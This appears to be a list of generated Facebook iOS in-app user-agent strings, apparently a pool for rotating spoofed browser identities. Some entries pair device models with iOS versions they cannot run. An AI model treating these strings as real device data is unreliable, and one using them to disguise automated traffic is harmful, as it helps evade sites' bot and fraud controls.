"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/687516257;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/630580114]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/543337750;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/611754257]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/295364110;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/512064419]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/145457410;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/174490475]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/688445733;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/653432567]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/522217015;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/646750671]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/208077110;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/622592164]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/352535584;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/389499039]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/619352380;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/320680663]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/677887321;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/628942533]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/369608091;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/686070093]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/543804326;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/334882532]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/322537579;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/359447709]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/373075386;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/639724769]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/110944122;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/132434428]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/612620117;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/556784940]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/650588066;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/270009500]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/637081544;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/588659300]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/140027486;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/691718712]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/528370995;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/618027185]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/326812885;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/356202218]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/376498411;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/118522177]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/604407348;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/247046460]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/218589033;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/620458766]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/117233825;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/112772331]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/608251284;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/358154976]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/454419808;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/202227217]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/140296364;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/148242095]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/438476703;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/636506724]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/263264642;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/679670506]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/607055254;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/303463590]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/496528967;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/119170016]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/503804888;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/460962007]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/190944487;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/530098121]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/679168388;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/183796393]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/207601807;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/690492601]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/531105653;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/527391795]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/136828411;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/291275858]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/683786201;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/620357922]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/500531883;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/251254089]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/518305051;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/603518851]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/175162723;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/352544454]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/633994471;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/638531620]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/661042541;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/442784491]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/102542056;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/592297857]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/363451661;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/485443811]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/455150619;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/551979210]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/524372036;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/540031043]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/444377767;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/664143923]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/139172509;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/442572326]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/667768427;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/100590995]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/383118699;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/352900750]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/420627641;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/351271769]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/520488387;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/539250457]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/674349264;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/378199999]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/107569892;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/509108288]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/372351585;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/524721210]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/340829118;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/277214823]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/355382324;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/609093394]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/476220705;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/478817897]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/584306030;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/475403004]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/418977926;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/173327555]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/435848459;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/626937562]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/310153136;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/643352800]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/378139114;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/229225012]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/672913628;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/595622228]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/658330889;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/376262392]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/512992158;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/609124783]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/326757286;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/315063619]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/353007712;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/116434164]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/653763248;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/501502925]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/687593920;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/194691468]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/612253283;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/100044150]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/209874779;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/360345780]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/274410351;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/685271194]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/674997353;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/139177593]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/687791912;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/372710515]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/256158161;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/104128826]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/230198099;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/136985833]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/688916669;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/548882581]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/187486462;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/549495746]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/500792596;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/335159388]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/506163122;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/244473665]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/684163018;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/227238458]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/684259241;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/698742012]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/443089354;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/500674602]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/482176425;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/450521972]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/207937215;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/517243122]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/683814588;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/368116092]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/317503278;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/590254080]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/100195662;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/495836195]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/365952752;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/670040119]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/586361156;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/275701995]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/371393848;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/167450586]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/675248104;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/398854954]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/648871539;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/442893075]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/655387971;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/555896312]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/535390063;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/360069197]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/268662775;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/693265393]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/673738382;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/518765750]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/264851680;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/130766141]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/541621040;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/139410956]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/232680170;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/163153784]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/329874255;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/581743010]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/358177475;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/248180932]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/242309331;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/663235777]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/534120761;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/583173016]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/266874774;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/367766266]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/538498973;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/661999444]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/416644982;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/577987153]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/183438265;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/104302558]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/142444144;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/347462278]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/366891591;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/115750566]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/239712241;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/412935099]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/411676456;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/347215142]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/184056975;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/403807103]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/575694800;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/649004413]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/364686591;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/370572521]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/224133323;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/492160185]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/534174330;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/125412532]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/572663808;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/219143110]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/506706514;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/507159275]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/153773453;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/198211213]",
